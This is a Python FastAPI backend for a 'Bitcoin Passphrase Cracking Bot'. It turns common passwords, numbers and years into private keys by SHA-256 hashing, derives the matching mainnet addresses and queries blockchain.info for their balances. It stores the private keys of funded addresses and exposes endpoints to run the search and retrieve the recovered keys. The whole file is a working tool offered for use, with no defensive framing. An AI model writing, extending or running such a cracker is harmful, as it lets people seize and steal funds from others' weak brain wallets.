from fastapi import FastAPI, APIRouter, HTTPException, BackgroundTasks
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List, Optional
import uuid
from datetime import datetime
import asyncio
import hashlib
import ecdsa
import base58
import requests
import time
import json

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Global state for cracking process
cracking_state = {
    "is_running": False,
    "current_passphrase": "",
    "total_attempts": 0,
    "found_keys": [],
    "start_time": None,
    "progress": 0
}

# Define Models
class CrackingResult(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    passphrase: str
    private_key: str
    bitcoin_address: str
    balance: float
    discovered_at: datetime = Field(default_factory=datetime.utcnow)

class CrackingAttempt(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    passphrase: str
    private_key: str
    bitcoin_address: str
    balance: float
    attempted_at: datetime = Field(default_factory=datetime.utcnow)

class CrackingStatus(BaseModel):
    is_running: bool
    current_passphrase: str
    total_attempts: int
    found_keys: int
    start_time: Optional[datetime]
    progress: float

# Bitcoin cryptography functions
def passphrase_to_private_key(passphrase: str) -> str:
    """Convert passphrase to private key using SHA-256 (like bitaddress.org)"""
    sha256_hash = hashlib.sha256(passphrase.encode('utf-8')).digest()
    return sha256_hash.hex()

def private_key_to_bitcoin_address(private_key_hex: str) -> str:
    """Convert private key to Bitcoin address"""
    try:
        # Convert hex private key to bytes
        private_key = bytes.fromhex(private_key_hex)
        
        # Generate public key using secp256k1
        sk = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
        vk = sk.verifying_key
        public_key = bytes.fromhex("04") + vk.to_string()
        
        # SHA-256 hash of public key
        sha256_bpk = hashlib.sha256(public_key).digest()
        
        # RIPEMD-160 hash
        ripemd160_bpk = hashlib.new('ripemd160', sha256_bpk).digest()
        
        # Add network byte (0x00 for mainnet)
        network_byte = b'\x00'
        network_bpk = network_byte + ripemd160_bpk
        
        # Double SHA-256 for checksum
        sha256_nbpk = hashlib.sha256(network_bpk).digest()
        sha256_2_nbpk = hashlib.sha256(sha256_nbpk).digest()
        checksum = sha256_2_nbpk[:4]
        
        # Final address
        binary_address = network_bpk + checksum
        address = base58.b58encode(binary_address)
        
        return address.decode()
    except Exception as e:
        logging.error(f"Error converting private key to address: {e}")
        return ""

async def check_bitcoin_balance(address: str) -> float:
    """Check Bitcoin balance using blockchain.info API"""
    try:
        url = f"https://blockchain.info/balance?active={address}"
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if address in data:
                # Balance is in satoshis, convert to BTC
                balance_satoshis = data[address]['final_balance']
                balance_btc = balance_satoshis / 100000000  # Convert satoshis to BTC
                return balance_btc
        return 0.0
    except Exception as e:
        logging.error(f"Error checking balance for {address}: {e}")
        return 0.0

# Common passphrases to try
def generate_common_passphrases():
    """Generate list of common passphrases to try"""
    passphrases = []
    
    # Simple words
    simple_words = [
        "password", "123456", "password123", "admin", "bitcoin", "satoshi",
        "nakamoto", "crypto", "blockchain", "wallet", "secret", "private",
        "key", "money", "cash", "gold", "silver", "test", "demo", "sample",
        "hello", "world", "user", "root", "god", "love", "family", "home",
        "work", "life", "happy", "lucky", "winner", "champion", "success"
    ]
    
    # Add simple words
    passphrases.extend(simple_words)
    
    # Add simple numbers
    for i in range(1, 1000):
        passphrases.append(str(i))
    
    # Add simple combinations
    for word in ["password", "bitcoin", "crypto", "wallet"]:
        for num in range(1, 100):
            passphrases.append(f"{word}{num}")
            passphrases.append(f"{num}{word}")
    
    # Add simple dates
    for year in range(1980, 2025):
        passphrases.append(str(year))
        passphrases.append(f"bitcoin{year}")
        passphrases.append(f"{year}bitcoin")
    
    return passphrases

async def crack_passphrases():
    """Main cracking function"""
    global cracking_state
    
    passphrases = generate_common_passphrases()
    total_passphrases = len(passphrases)
    
    cracking_state["is_running"] = True
    cracking_state["start_time"] = datetime.utcnow()
    
    for i, passphrase in enumerate(passphrases):
        if not cracking_state["is_running"]:
            break
            
        cracking_state["current_passphrase"] = passphrase
        cracking_state["total_attempts"] = i + 1
        cracking_state["progress"] = (i + 1) / total_passphrases * 100
        
        try:
            # Generate private key from passphrase
            private_key = passphrase_to_private_key(passphrase)
            
            # Generate Bitcoin address
            bitcoin_address = private_key_to_bitcoin_address(private_key)
            
            if bitcoin_address:
                # Check balance
                balance = await check_bitcoin_balance(bitcoin_address)
                
                # Store attempt in database
                attempt = CrackingAttempt(
                    passphrase=passphrase,
                    private_key=private_key,
                    bitcoin_address=bitcoin_address,
                    balance=balance
                )
                await db.cracking_attempts.insert_one(attempt.dict())
                
                # If balance > 0, it's a successful crack!
                if balance > 0:
                    result = CrackingResult(
                        passphrase=passphrase,
                        private_key=private_key,
                        bitcoin_address=bitcoin_address,
                        balance=balance
                    )
                    await db.cracking_results.insert_one(result.dict())
                    cracking_state["found_keys"].append(result.dict())
                    logging.info(f"SUCCESS! Found private key with balance: {passphrase} -> {bitcoin_address} ({balance} BTC)")
                
                # Rate limiting to avoid API limits
                await asyncio.sleep(0.5)  # 2 requests per second max
                
        except Exception as e:
            logging.error(f"Error processing passphrase '{passphrase}': {e}")
    
    cracking_state["is_running"] = False

# API Routes
@api_router.get("/")
async def root():
    return {"message": "Bitcoin Passphrase Cracking Bot"}

@api_router.post("/start-cracking")
async def start_cracking(background_tasks: BackgroundTasks):
    if cracking_state["is_running"]:
        raise HTTPException(status_code=400, detail="Cracking is already running")
    
    # Reset state
    cracking_state["total_attempts"] = 0
    cracking_state["found_keys"] = []
    cracking_state["progress"] = 0
    
    # Start cracking in background
    background_tasks.add_task(crack_passphrases)
    
    return {"message": "Cracking started", "status": "running"}

@api_router.post("/stop-cracking")
async def stop_cracking():
    cracking_state["is_running"] = False
    return {"message": "Cracking stopped", "status": "stopped"}

@api_router.get("/status", response_model=CrackingStatus)
async def get_status():
    return CrackingStatus(
        is_running=cracking_state["is_running"],
        current_passphrase=cracking_state["current_passphrase"],
        total_attempts=cracking_state["total_attempts"],
        found_keys=len(cracking_state["found_keys"]),
        start_time=cracking_state["start_time"],
        progress=cracking_state["progress"]
    )

@api_router.get("/results", response_model=List[CrackingResult])
async def get_results():
    results = await db.cracking_results.find().to_list(1000)
    return [CrackingResult(**result) for result in results]

@api_router.get("/attempts")
async def get_attempts(limit: int = 100):
    attempts = await db.cracking_attempts.find().sort("attempted_at", -1).limit(limit).to_list(limit)
    return [CrackingAttempt(**attempt) for attempt in attempts]

@api_router.delete("/clear-data")
async def clear_data():
    await db.cracking_attempts.delete_many({})
    await db.cracking_results.delete_many({})
    cracking_state["total_attempts"] = 0
    cracking_state["found_keys"] = []
    return {"message": "All data cleared"}

# Test endpoint to verify crypto functions
@api_router.post("/test-crypto")
async def test_crypto(passphrase: str):
    private_key = passphrase_to_private_key(passphrase)
    bitcoin_address = private_key_to_bitcoin_address(private_key)
    balance = await check_bitcoin_balance(bitcoin_address)
    
    return {
        "passphrase": passphrase,
        "private_key": private_key,
        "bitcoin_address": bitcoin_address,
        "balance": balance
    }

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()